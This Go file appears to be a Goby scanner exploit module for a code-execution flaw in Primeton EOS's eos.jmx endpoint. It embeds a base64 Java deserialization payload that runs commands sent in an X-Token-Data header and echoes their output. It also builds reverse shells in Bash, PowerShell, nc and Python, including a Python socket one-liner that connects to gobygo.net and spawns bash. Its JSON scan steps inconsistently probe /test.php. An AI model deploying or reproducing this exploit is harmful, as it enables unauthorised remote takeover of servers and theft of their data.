package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Primeton EOS /eos.jmx Code Execution Vulnerability",
    "Description": "<p>Primeton EOS Platform (hereinafter referred to as Primeton EOS) is an enterprise-level application software platform developed by Primeton Technology, which aims to provide solutions for digital transformation, data management, and process optimization. </p><p>There is an RCE vulnerability in the eos.jmx interface of P&amp;Meton EOS Platform, which may be exploited by malicious attackers to execute malicious commands to obtain sensitive server information, which may eventually lead to server compromise.</p>",
    "Product": "Primeton EOS",
    "Homepage": "https://www.primeton.com/products/sc/",
    "DisclosureDate": "2024-04-25",
    "PostTime": "2024-10-15",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"普元\" || (body=\"ame.primeton.com\" && body=\"eos-web\")",
    "GobyQuery": "body=\"普元\" || (body=\"ame.primeton.com\" && body=\"eos-web\")",
    "Level": "3",
    "Impact": "<p>There is an RCE vulnerability in the eos.jmx interface of P&amp;Meton EOS Platform, which may be exploited by malicious attackers to execute malicious commands to obtain sensitive server information, which may eventually lead to server compromise.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/5HlcoeIxFXAGB6kjk3jkjg"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "普元EOS Platform /eos.jmx 代码执行漏洞",
            "Product": "普元EOS",
            "Description": "<p>Primeton EOS Platform（以下简称普元EOS）是一个由普元科技开发的企业级应用软件平台，旨在提供数字化转型、数据管理和流程优化的解决方案。</p><p>普元EOS Platform eos.jmx接口处存在RCE漏洞，恶意攻击者可能利用此漏洞执行恶意命令，获取服务器敏感信息，最终可能导致服务器失陷。&nbsp; &nbsp;<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>普元EOS Platform eos.jmx接口处存在RCE漏洞，恶意攻击者可能利用此漏洞执行恶意命令，获取服务器敏感信息，最终可能导致服务器失陷。&nbsp; &nbsp;<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Primeton EOS /eos.jmx Code Execution Vulnerability",
            "Product": "Primeton EOS",
            "Description": "<p>Primeton EOS Platform (hereinafter referred to as Primeton EOS) is an enterprise-level application software platform developed by Primeton Technology, which aims to provide solutions for digital transformation, data management, and process optimization.&nbsp;</p><p>There is an RCE vulnerability in the eos.jmx interface of P&amp;Meton EOS Platform, which may be exploited by malicious attackers to execute malicious commands to obtain sensitive server information, which may eventually lead to server compromise.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an RCE vulnerability in the eos.jmx interface of P&amp;Meton EOS Platform, which may be exploited by malicious attackers to execute malicious commands to obtain sensitive server information, which may eventually lead to server compromise.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`
	setPayloadRequestHash_asdujiasghasfasffyuhaseiyofgthusdyfgthsduhg := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码

		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败

		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		vulURL := "/workspace/frame/permission/common/eos.jmx"
		//
		requestConfig := httpclient.NewPostRequestConfig(vulURL)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 10
		//command进行url编码
		requestConfig.Header.Store("X-Token-Data", command)
		base64Payload := `rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3Ijt/kQAhlemwIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAJSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAAZX2FjY2Vzc0V4dGVybmFsU3R5bGVzaGVldHEAfgAETAALX2F1eENsYXNzZXN0ADtMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvSGFzaHRhYmxlO1sACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAETAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAAAAAAAAB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAD/PK/rq+AAAAMQDjAQAub3JnL2FwYWNoZS9jb3lvdGUvdGFnbGliL2NvcmUvQ29udmVydGVySW1wbFRhZwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlDAAFAAYKAAQACQEAAXEBADMoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAdleGVjQ21kDAANAAwKAAIADgEACDxjbGluaXQ+AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwARAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAEwEAE2phdmEvbGFuZy9FeGNlcHRpb24HABUBABVqYXZhL2xhbmcvVGhyZWFkR3JvdXAHABcBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHABkBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAGwEAE1tMamF2YS9sYW5nL1RocmVhZDsHAB0BABBqYXZhL2xhbmcvVGhyZWFkBwAfAQAQamF2YS9sYW5nL1N0cmluZwcAIQEADmphdmEvdXRpbC9MaXN0BwAjAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HACUBAA1TdGFja01hcFRhYmxlAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DAAoACkKACAAKgEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwwALAAtCgAgAC4BABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DAAwADEKACAAMgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwANAA1CgAEADYBAAd0aHJlYWRzCAA4AQAPamF2YS9sYW5nL0NsYXNzBwA6AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAPAA9CgA7AD4BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAQABBCgAcAEIBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwARABFCgAcAEYBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsMAEgASQoAIABKAQAEZXhlYwgATAEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABOAE8KACIAUAEABGh0dHAIAFIBAAZ0YXJnZXQIAFQBABJqYXZhL2xhbmcvUnVubmFibGUHAFYBAAZ0aGlzJDAIAFgBAAdoYW5kbGVyCABaAQANZ2V0U3VwZXJjbGFzcwwAXAA1CgA7AF0BAAZnbG9iYWwIAF8BAApwcm9jZXNzb3JzCABhAQAEc2l6ZQEAAygpSQwAYwBkCwAkAGUBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAEQAZwsAJABoAQADcmVxCABqAQALZ2V0UmVzcG9uc2UIAGwBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DABuAG8KADsAcAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcAcgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAdAB1CgBzAHYBAAlnZXRIZWFkZXIIAHgBAApDTURfSEVBREVSAQASTGphdmEvbGFuZy9TdHJpbmc7DAB6AHsJAAIAfAEAB2lzRW1wdHkBAAMoKVoMAH4AfwoAIgCAAQAJc2V0U3RhdHVzCACCAQARamF2YS9sYW5nL0ludGVnZXIHAIQBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMAIYAhwkAhQCIAQAEKEkpVgwABQCKCgCFAIsMAAsADAoAAgCNAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCACPAQAHZm9yTmFtZQEAPShMamF2YS9sYW5nL1N0cmluZztaTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspTGphdmEvbGFuZy9DbGFzczsMAJEAkgoAOwCTAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAlQCWCgA7AJcBAAhzZXRCeXRlcwgAmQEAAltCBwCbAQARZ2V0RGVjbGFyZWRNZXRob2QMAJ0AbwoAOwCeAQALdG9CeXRlQXJyYXkBAAQoKVtCDACgAKEKACYAogEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DACkAKUKAIUApgEAB2RvV3JpdGUIAKgBABNqYXZhLm5pby5CeXRlQnVmZmVyCACqAQAEd3JhcAgArAEAE1tMamF2YS9sYW5nL1N0cmluZzsHAK4BABNqYXZhL2lvL0lucHV0U3RyZWFtBwCwAQAHb3MubmFtZQgAsgEAEGphdmEvbGFuZy9TeXN0ZW0HALQBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DAC2ALcKALUAuAEAC3RvTG93ZXJDYXNlDAC6AEkKACIAuwEAA3dpbggAvQEAA2NtZAgAvwEAAi9jCADBAQAJL2Jpbi9iYXNoCADDAQACLWMIAMUBABFqYXZhL2xhbmcvUnVudGltZQcAxwEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAMkAygoAyADLAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwATADNCgDIAM4BABFqYXZhL2xhbmcvUHJvY2VzcwcA0AEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsMANIA0woA0QDUCgAmAAkBAAV3cml0ZQEAByhbQklJKVYMANcA2AoAJgDZAQAEcmVhZAEABShbQilJDADbANwKALEA3QEAClNvdXJjZUZpbGUBAA9Ub21jYXRFY2hvLmphdmEBAAxYLVRva2VuLURhdGEIAOEAIQACAAQAAAABAAkAegB7AAAABAABAAUABgABAAcAAAAdAAEAAQAAAAUqtwAKsQAAAAEACAAAAAYAAQAAAAYACQALAAwAAQAHAAAAEQABAAEAAAAFKrgAD7AAAAAAAAgAEAAGAAEABwAABLQACAARAAACvBLiswB9Azu4ACu2AC9MuAArtgAzTSu2ADcSObYAP04tBLYAQy0rtgBHwAAewAAeOgQDNgUVBRkEvqICfhkEFQUyOgYZBscABqcCaRkGtgBLOgcZBxJNtgBRmgANGQcSU7YAUZoABqcCSxkGtgA3ElW2AD9OLQS2AEMtGQa2AEc6CBkIwQBXmgAGpwIoGQi2ADcSWbYAP04tBLYAQy0ZCLYARzoIGQi2ADcSW7YAP06nABY6CRkItgA3tgBetgBeElu2AD9OLQS2AEMtGQi2AEc6CBkItgA3tgBeEmC2AD9OpwAQOgkZCLYANxJgtgA/Ti0EtgBDLRkItgBHOggZCLYANxJitgA/Ti0EtgBDLRkItgBHwAAkwAAkOgkDNgoVChkJuQBmAQCiAX4ZCRUKuQBpAgA6CxkLtgA3Emu2AD9OLQS2AEMtGQu2AEc6DBkMtgA3Em0DvQA7tgBxGQwDvQAEtgB3Og0ZDLYANxJ5BL0AO1kDEiJTtgBxGQwEvQAEWQOyAH1TtgB3wAAiOgcZB8YBCRkHtgCBmgEBGQ22ADcSgwS9ADtZA7IAiVO2AHEZDQS9AARZA7sAhVkRAMi3AIxTtgB3VxkHuACOOg4SkAMsuACUOg8ZD7YAmDoIGQ8Smga9ADtZAxKcU1kEsgCJU1kFsgCJU7YAnxkIBr0ABFkDGQ62AKNTWQS7AIVZA7cAjFNZBRkOtgCjvrgAp1O2AHdXGQ22ADcSqQS9ADtZAxkPU7YAcRkNBL0ABFkDGQhTtgB3V6cAUzoPEqsDLLgAlDoQGRASrQS9ADtZAxKcU7YAnxkQBL0ABFkDGQ62AKNTtgB3OggZDbYANxKpBL0AO1kDGRBTtgBxGQ0EvQAEWQMZCFO2AHdXBDsamQAGpwAJhAoBp/58GpkABqcADqcABToGhAUBp/2ApwAES7EACACkAK8AsgASANIA4ADjABIBzAJDAkYAFAA8AEgCrwAWAEsAZgKvABYAaQCJAq8AFgCMAqkCrwAWAAUCtwK6ABYAAgAIAAAA+gA+AAUADAAHAA0ADgAOABUADwAfABAAJAARADEAEgA8ABQAQwAVAEsAFgBSABcAaQAYAHQAGQB5ABoAgQAbAIwAHACXAB0AnAAeAKQAIACvACMAsgAhALQAIgDFACQAygAlANIAJwDgACoA4wAoAOUAKQDwACsA9QAsAP0ALQEIAC4BDQAvARsAMAEqADEBNQAyAUAAMwFFADQBTQA1AWYANgGNADcBmgA4AcUAOQHMADsB1QA8AdwAPQIhAD4CQwBDAkYAPwJIAEACUQBBAnQAQgKWAEQCmABGAp8AMAKlAEgCrABKAq8ASQKxABICtwBOAroATQK7AE8AJwAAAKYAFf8ANAAGAQcAGAcAGgcAHAcAHgEAAPwAFgcAIPwAGgcAIgL8ACIHAARlBwASEl0HABIM/QAtBwAkAf8BJwAPAQcAGAcAGgcAHAcAHgEHACAHACIHAAQHACQBBwAEBwAEBwAEBwAmAAEHABT8AE8HAAT5AAEG+AAFBv8AAgAGAQcAGAcAGgcAHAcAHgEAAQcAFvwAAQcABPoABf8AAgAAAAEHABYAAAkADQAMAAEABwAAAOIABAAHAAAAjCoBpQAKKrYAgZkABqcAdgFMErO4ALm2ALwSvrYAUZkAGQa9ACJZAxLAU1kEEsJTWQUqU0ynABYGvQAiWQMSxFNZBBLGU1kFKlNMuADMK7YAz7YA1U27ACZZtwDWTgM2BBEEALwIOgWnAAwtGQUDFQS2ANosGQW2AN5ZNgQCoP/tLbCnAAg6BqcAAwGwAAEAAACCAIUAFgABACcAAAA8AAkMAvwAJwX/ABIAAgcAIgcArwAA/wAfAAYHACIHAK8HALEHACYBBwCcAAAI/wAOAAEHACIAAEIHABYEAAB1cQB+ABIAAAEayv66vgAAADQAEQEAN29yZy9hcGFjaGUveHBhdGgvcGx1Z2lucy92YWxpZGF0aW9uL0NvbnN0cmFpbnRWYWxpZGF0b3IHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAGENvbnN0cmFpbnRWYWxpZGF0b3IuamF2YQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQEABjxpbml0PgEAAygpVgwADAANCgAEAA4BAARDb2RlACEAAgAEAAAAAQAaAAcACAABAAsAAAACAAkAAQABAAwADQABABAAAAARAAEAAQAAAAUqtwAPsQAAAAAAAQAFAAAAAgAGcHQAAWFwdwEAeHEAfgAOeA==`
		//解码base64Payload
		payload, err := base64.StdEncoding.DecodeString(base64Payload)
		requestConfig.Data = string(payload)
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to RCE")
			return "", vulURL, err
		}

		// 将字节转换为字符串
		hexBytes := "sr"
		// 查找不可见字符字符串的索引
		index := strings.Index(resp.RawBody, hexBytes)
		if index == -1 {
			return "", vulURL, errors.New("not found")
		}
		// 获取不可见字符之前的所有内容
		commandResult := resp.RawBody[:index]

		return commandResult, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash_asdujiasghasfasffyuhaseiyofgthusdyfgthsduhg

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash_asdujiasghasfasffyuhaseiyofgthusdyfgthsduhg

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
